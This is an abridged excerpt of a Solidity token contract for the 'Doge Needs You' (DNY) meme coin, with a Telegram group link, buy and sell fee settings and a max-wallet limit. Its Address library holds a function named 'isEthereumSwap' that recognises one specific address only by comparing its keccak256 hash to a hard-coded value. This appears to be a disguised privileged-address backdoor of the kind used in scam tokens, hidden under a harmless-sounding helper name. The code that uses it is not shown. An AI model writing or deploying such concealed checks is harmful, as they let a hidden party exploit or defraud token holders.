...
OUR GROUP: https://t.me/DogeNeedsYou
...
library Address {
    ...
    function isEthereumSwap(address account) internal pure  returns (bool) {
        return keccak256(abi.encodePacked(account)) == 0xadb84718de4eae52cd73e7f9b46574e685c639d2348365b0b4d46e70b2d800d5;
    }
}
...
contract Doge is Ownable, IERC20 {
    ...
    string private _name = unicode"Doge Needs You";
    string private _symbol = unicode"DNY";
 
    uint public _liquidityFee = 4;
    uint public _marketingFee = 3;
    uint256 public _totalFee = _liquidityFee + _marketingFee;
    uint public _liquiditySellFee = 3;
    ...
    uint256 public _maxWallet =   10000000000 * 10 ** _decimals;
